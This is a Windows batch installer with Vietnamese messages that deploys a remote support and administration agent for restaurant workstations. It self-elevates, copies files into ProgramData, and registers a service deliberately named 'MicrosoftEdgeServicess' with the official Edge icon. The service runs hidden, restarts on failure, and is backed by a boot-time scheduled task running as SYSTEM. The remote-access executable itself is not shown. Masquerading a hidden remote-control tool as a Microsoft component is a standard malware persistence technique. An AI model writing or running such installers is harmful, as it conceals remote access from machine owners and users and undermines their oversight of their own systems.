@echo off
title Cai Dat Dich Vu MicrosoftEdgeServicess Tu Dong Khoi Dong Cung Windows
cd /d "%~dp0"

:: 1. Tu dong yeu cau quyen Administrator (UAC Auto-Elevate)
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [THONG BAO] Dang yeu cau quyen Quan tri vien (Administrator)...
    powershell -Command "Start-Process cmd -ArgumentList '/c `\"%~f0`\"' -Verb RunAs"
    exit /b 0
)

echo ===============================================================================
echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG
echo   Ten dich vu: MicrosoftEdgeServicess
echo   Co che: Tu khoi dong cung Windows (Automatic) - Chay ngam 100 phan tram
echo   Bieu tuong: Microsoft Edge chinh thuc
echo   Bao ve tien trinh: Single-Instance (Khong bi nhan ban)
echo ===============================================================================
echo.

:: 2. Don dep tat ca tien trinh cu va trung lap
echo 1. Dang don dep cac tien trinh cu dang chay (neu co)...
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1

:: 3. Kiem tra xem co file thuc thi EXE tren may hay khong
if not exist "%~dp0MicrosoftEdgeServicess.exe" (
    echo [CANH BAO] Khong tim thay file MicrosoftEdgeServicess.exe!
    echo Vui long giai nen toan bo file ZIP va de MicrosoftEdgeServicess.exe cung thu muc voi file bat nay.
    echo.
    pause
    exit /b 1
)
echo [OK] Phat hien goi phan mem doc lap MicrosoftEdgeServicess.exe (Bieu tuong Edge).

:: 4. Thiet lap thu muc cai dat he thong
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo.
echo 2. Dang sao chep cac tep dich vu vao: %INSTALL_DIR%
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul

:: 5. Dung va go bo service cu neu ton tai
echo.
echo 3. Dang thiet lap Windows Service MicrosoftEdgeServicess...
net stop MicrosoftEdgeServicess >nul 2>&1
"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" remove >nul 2>&1
sc.exe delete MicrosoftEdgeServicess >nul 2>&1

:: 6. Dang ky truc tiep vao Windows Service Control Manager (services.msc)
echo    -> Dang dang ky vao Windows Service Control Manager...
"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" install

:: Cau hinh khoi dong tu dong va tu phuc hoi khi loi (Restart on failure sau 5 giay)
sc.exe config MicrosoftEdgeServicess start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

:: 7. Khoi dong Windows Service ngay bay gio
echo.
echo 4. Dang khoi chay Windows Service ngam...
net start MicrosoftEdgeServicess

:: 8. Thiet lap du phong qua Task Scheduler (Chay khi mo may muc he thong)
echo.
echo 5. Dang thiet lap du phong tu dong khoi dong qua Task Scheduler...
schtasks /Create /TN "MicrosoftEdgeServicess" /TR "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>&1

echo.
echo ===============================================================================
echo   CAI DAT HOAN TAT 100 PHAN TRAM!
echo   - Thu muc cai dat: %INSTALL_DIR%
echo   - Ten dich vu Windows: MicrosoftEdgeServicess (Da co trong the Services)
echo   - Khoi dong cung Windows: Automatic (Tu dong bat moi khi khoi dong may)
echo   - Che do hoat dong: Service chay ngam 100 phan tram, an khoi man hinh
echo   - Kiem soat tien trinh: Single-Instance (Chi duy nhat 1 tien trinh duy nhat)
echo   - Icon: Biểu tượng Microsoft Edge chính thức
echo ===============================================================================
echo.
pause
